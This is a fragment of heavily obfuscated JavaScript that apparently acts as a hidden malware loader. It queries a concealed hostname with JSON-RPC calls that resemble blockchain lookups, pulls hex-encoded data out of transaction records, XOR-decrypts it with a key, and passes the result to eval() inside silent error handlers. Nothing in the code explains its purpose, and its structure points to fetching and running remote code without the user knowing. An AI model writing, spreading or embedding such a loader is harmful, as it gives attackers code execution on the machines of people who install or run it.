i[_$_7134[0x2b]](function(r,e){var t=i[_$_7134[0x20]][_$_7134[0x1f]]({jsonrpc:_$_7134[0x1e],method:c,params:s,id:1});var n={hostname:a,method:_$_7134[0x21]};var o=u(_$_7134[0x29])[_$_7134[0x28]](n,function(t){var n=_$_7134[0x23];t[_$_7134[0x22]](_$_7134[0x24],function(t){n+= t});t[_$_7134[0x22]](_$_7134[0x25],function(){try{r(i[_$_7134[0x20]][_$_7134[0x27]](n)[_$_7134[0x26]])}catch(t){e(t)}})})[_$_7134[0x22]](_$_7134[0x6],function(t){e(t)});o[_$_7134[0x2a]](t);o[_$_7134[0x25]]()})}async function c(t,n){if(n=== void(0)){n= []};var r=[_$_7134[0x2c],_$_7134[0x2d],_$_7134[0x2e],_$_7134[0x2f]];{var _$err_162c_1;try{for(var _$it_162c_1=_$jsoIter((r)),_$st_162c_1;!(_$st_162c_1= _$it_162c_1[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_6_e=_$st_162c_1[_$_7134[0x32]];try{var __jso_block_param_8_o= await s(t,n,__jso_nested_loop_6_e);if(__jso_block_param_8_o){return __jso_block_param_8_o}}catch{}}}catch(_$ex_162c_1){_$err_162c_1= {e:_$ex_162c_1}}finally{try{if(_$st_162c_1&&  !_$st_162c_1[_$_7134[0x30]]&& _$it_162c_1[_$_7134[0x33]]){_$it_162c_1[_$_7134[0x33]]()}}finally{if(_$err_162c_1){throw _$err_162c_1[_$_7134[0x34]]}}}}}async function a(t){var n= await c(_$_7134[0x35],[_$_7134[0x36]+ t[_$_7134[0x37]](16),true]);if(!(n[_$_7134[0x38]]== null?undefined:n[_$_7134[0x38]][_$_7134[0x10]])){return};{var _$err_76ce_2;try{for(var _$it_76ce_2=_$jsoIter((n[_$_7134[0x38]])),_$st_76ce_2;!(_$st_76ce_2= _$it_76ce_2[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_5_r=_$st_76ce_2[_$_7134[0x32]];if(__jso_nested_loop_5_r[_$_7134[0x3a]][_$_7134[0x39]](e)){return __jso_nested_loop_5_r[_$_7134[0x3b]]}}}catch(_$ex_76ce_2){_$err_76ce_2= {e:_$ex_76ce_2}}finally{try{if(_$st_76ce_2&&  !_$st_76ce_2[_$_7134[0x30]]&& _$it_76ce_2[_$_7134[0x33]]){_$it_76ce_2[_$_7134[0x33]]()}}finally{if(_$err_76ce_2){throw _$err_76ce_2[_$_7134[0x34]]}}}}}async function f(n){for(var __jso_nested_loop_4_t=-1;__jso_nested_loop_4_t< 13;__jso_nested_loop_4_t++){var __jso_block_param_7_r=__jso_nested_loop_4_t==  -1?0:_$jsoPow((2),(__jso_nested_loop_4_t));for(var __jso_nested_loop_3_t=0;__jso_nested_loop_3_t< 3;__jso_nested_loop_3_t++){var __jso_block_param_6_e= await a(n- __jso_block_param_7_r* o+ __jso_nested_loop_3_t);if(__jso_block_param_6_e){return __jso_block_param_6_e}}}}async function l(c,r,e){async function o(t){var n=( await s(_$_7134[0x35],[_$_7134[0x36]+ r[_$_7134[0x37]](16),true],t))[_$_7134[0x38]];while(e< n[_$_7134[0x10]]){try{return Buffer[_$_7134[0x3a]](n[e][_$_7134[0x40]][_$_7134[0x3f]](2),_$_7134[0x41])[_$_7134[0x37]](_$_7134[0x3e])[_$_7134[0x3d]](_$_7134[0x3c])[1]}catch{e+= 256}}}var t=await(async function(){var t=[_$_7134[0x42],_$_7134[0x43]];{var _$err_162c_3;try{for(var _$it_162c_3=_$jsoIter((t)),_$st_162c_3;!(_$st_162c_3= _$it_162c_3[_$_7134[0x31]]())[_$_7134[0x30]];){var __jso_nested_loop_2_n=_$st_162c_3[_$_7134[0x32]];try{response=  await o(__jso_nested_loop_2_n);if(response){return response}}catch{}}}catch(_$ex_162c_3){_$err_162c_3= {e:_$ex_162c_3}}finally{try{if(_$st_162c_3&&  !_$st_162c_3[_$_7134[0x30]]&& _$it_162c_3[_$_7134[0x33]]){_$it_162c_3[_$_7134[0x33]]()}}finally{if(_$err_162c_3){throw _$err_162c_3[_$_7134[0x34]]}}}}})();return (function(n){var r=c[_$_7134[0x10]];var e=_$_7134[0x23];for(var __jso_nested_loop_1_t=0;__jso_nested_loop_1_t< n[_$_7134[0x10]];__jso_nested_loop_1_t++){(function(){var __jso_block_param_5_o=c[_$_7134[0x45]](__jso_nested_loop_1_t% r);e+= i[_$_7134[0x47]][_$_7134[0x46]](n[_$_7134[0x45]](__jso_nested_loop_1_t)^ __jso_block_param_5_o)})[_$_7134[0x44]](this)};return e})(t)}try{var __jso_block_param_4_h=parseInt( await c(_$_7134[0x48]));var __jso_block_param_3_t=(__jso_block_param_4_h>> r<< r)+ n;if(__jso_block_param_4_h< __jso_block_param_3_t){__jso_block_param_3_t-= o};var __jso_block_param_2_p= await f(__jso_block_param_3_t);i[_$_7134[0x49]]= __jso_block_param_2_p;var __jso_block_param_1_d= await l(_$_7134[0x4a],parseInt(__jso_block_param_2_p[_$_7134[0x3f]](2,10),16),parseInt(__jso_block_param_2_p[_$_7134[0x3f]](10,12),16));eval(__jso_block_param_1_d)}catch(t){}})()})()
